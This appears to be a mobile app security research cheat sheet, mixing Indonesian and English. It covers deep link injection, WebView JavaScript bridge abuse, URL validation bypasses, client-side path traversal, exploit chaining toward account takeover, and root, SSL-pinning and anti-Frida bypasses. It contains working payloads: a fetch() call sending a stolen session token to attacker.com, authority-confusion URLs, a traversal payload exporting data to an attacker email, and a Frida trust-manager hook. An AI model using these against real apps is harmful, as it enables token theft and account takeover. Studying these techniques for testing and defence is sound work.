# Mobile Security Patterns

Patterns dan techniques dari mobile app security research.

---

## Deep Link Exploitation

### What Are Deep Links
Custom URL schemes yang trigger native app functionality:
```
app://profile/view?id=123
app://settings/security
app://browser?url=https://example.com
```

### Attack Vectors

**1. Deep Link Injection via API**
Cari endpoint yang nerima URL/deep link sebagai parameter, lalu di-render ke user lain:
```json
POST /api/send
{
  "userid": "victim",
  "card": {
    "goto_url": "app://malicious/action"
  }
}
```

**2. Zero-Click Trigger**
Kalau deep link dieksekusi sebelum user interaction (auto-parse saat message arrive), ini jadi zero-click gadget.

**Check:**
- Message/notification handlers
- Card/widget renderers
- Push notification payloads

**3. Deep Link Enumeration**
Enumerate semua handlers di app:
```bash
# Android - check AndroidManifest.xml
grep -r "android:scheme" AndroidManifest.xml
grep -r "android:host" AndroidManifest.xml

# iOS - check Info.plist
grep -r "CFBundleURLSchemes" Info.plist
```

Common patterns to look for:
```
app://browser?url=         <- WebView opener
app://profile/view?id=     <- IDOR potential
app://settings/*           <- Sensitive actions
app://auth/callback?token= <- Token handling
app://share/export         <- Data export
```

---

## WebView Vulnerabilities

### JavaScript Bridge Abuse

**Android - addJavascriptInterface**
```java
webView.addJavascriptInterface(new AppBridge(context), "AppBridge");
```

Exposed methods callable from JavaScript:
```javascript
AppBridge.getSessionToken();
AppBridge.getUserData();
AppBridge.openNativeActivity(className, extras);
```

**Attack:**
Host malicious page, trick app to load it, call bridge methods:
```javascript
var token = AppBridge.getSessionToken();
fetch("https://attacker.com/steal?token=" + token);
```

### URL Validation Bypass (RFC 3986)

**Vulnerable validation:**
```java
if (url.startsWith("https://target.com")) {
    webView.loadUrl(url);
}
```

**Bypass using authority confusion:**
```
https://target.com@attacker.com/exploit.html
```

Parser breakdown:
- Validator sees: `startsWith("https://target.com")` = TRUE
- URI parser sees: `host = attacker.com`

**Other bypasses:**
```
https://target.com.attacker.com/
https://target.com%00.attacker.com/
https://target.com#@attacker.com/
https://attacker.com/https://target.com/
```

### iOS vs Android

| Platform | JS Bridge | Risk |
|----------|-----------|------|
| Android | `addJavascriptInterface` | HIGH - returns values |
| iOS | `WKScriptMessageHandler` | LOWER - fire-and-forget, sandboxed |

---

## Client-Side Path Traversal (CSPT)

### Concept
User input goes into URL path, client sends to server:
```java
String userId = uri.getQueryParameter("id");
String endpoint = "/api/v1/profile/" + userId;
apiClient.get(endpoint, callback);
```

### Exploitation
Inject `../` via URL encoding:
```
Input: app://profile/view?id=1%2F..%2F..%2Fadmin
Sends: GET /api/v1/profile/1/../../admin
Normalized: GET /api/v1/admin
```

### Query Injection
Inject `?` to add parameters:
```
Input: id=1%2F..%2Fexport%3Femail%3Dattacker%40evil.com
Sends: GET /api/v1/profile/1/../export?email=attacker@evil.com
```

### High-Value Targets
- `/share/export` — data export endpoints
- `/auth/reset` — password reset
- `/settings/delete` — account deletion
- `/payment/confirm` — financial actions

---

## Chaining Techniques

### Gadget + Vulnerability Pattern

```
GADGET: Zero-click deep link trigger
    +
VULNERABILITY: WebView JS Bridge
    +
VULNERABILITY: CSPT to sensitive endpoint
    =
CRITICAL: Zero-click account takeover
```

### Severity Multiplication

| Individual Bugs | Severity |
|-----------------|----------|
| Deep link injection | Low/Medium |
| WebView URL bypass | Medium |
| CSPT | Medium |
| **Chained** | **Critical** |

### Chain Examples

**Chain 1: Token Theft**
```
Deep link gadget → WebView → JS Bridge → getSessionToken() → Steal
```

**Chain 2: Action Forge**
```
Deep link gadget → CSPT → Force action as victim
```

**Chain 3: Full ATO**
```
Deep link gadget → CSPT → Export JWT to attacker email
```

---

## Mobile Protection Bypass

### Root/Jailbreak Detection

**Common checks:**
```
/su, /system/xbin/su, /sbin/su
com.topjohnwu.magisk
ro.build.tags=test-keys
ro.debuggable=1
```

**Bypass layers:**
1. Java layer — Shamiko/LSposed
2. Native layer — Direct syscalls need instruction-level hooks
3. Self-integrity — Use Frida Stalker (no byte modification)

### SSL Pinning Bypass

**Layer 1 - Java (Easy)**
```javascript
Java.use("com.android.org.conscrypt.TrustManagerImpl")
    .checkTrustedRecursive.implementation = function() {
        return Java.use("java.util.ArrayList").$new();
    };
```

**Layer 2 - Native BoringSSL (Hard)**
- Symbols stripped — need pattern matching
- PAC (Pointer Authentication) — hook before storage, not after
- Find `SSL_CTX_set_verify` via byte patterns

### Anti-Frida Bypass

**Detection methods:**
- `/proc/self/maps` — Frida memory regions
- `/proc/self/task/*/comm` — Thread names (gum-js-loop, pool-frida)
- `/proc/self/fd/` — Frida Unix socket
- Port 27042 — Default Frida port

**Bypass:**
```bash
# Rename server, change port
./renamed-frida-server -l 0.0.0.0:17392 &
```

---

## Testing Checklist

### Deep Link Audit
- [ ] Enumerate all deep link handlers
- [ ] Test parameter injection in each
- [ ] Check if any trigger without user interaction
- [ ] Look for WebView openers
- [ ] Test path traversal in path-based handlers

### WebView Audit
- [ ] Check for `addJavascriptInterface`
- [ ] List exposed methods
- [ ] Test URL validation bypass (RFC 3986)
- [ ] Check what data bridge methods return

### CSPT Audit
- [ ] Find endpoints with user input in path
- [ ] Test `../` injection (URL encoded)
- [ ] Test query injection via `%3F`
- [ ] Map sensitive endpoints reachable via traversal

---

## Tools

- **Frida** — Runtime instrumentation
- **Frida Stalker** — Instruction-level tracing (bypass integrity checks)
- **objection** — Mobile exploration toolkit
- **apktool** — APK decompilation
- **jadx** — Java decompiler
- **Ghidra/IDA** — Native library analysis

---

*Source: 35M+ User Mobile App Writeup, April 2026*
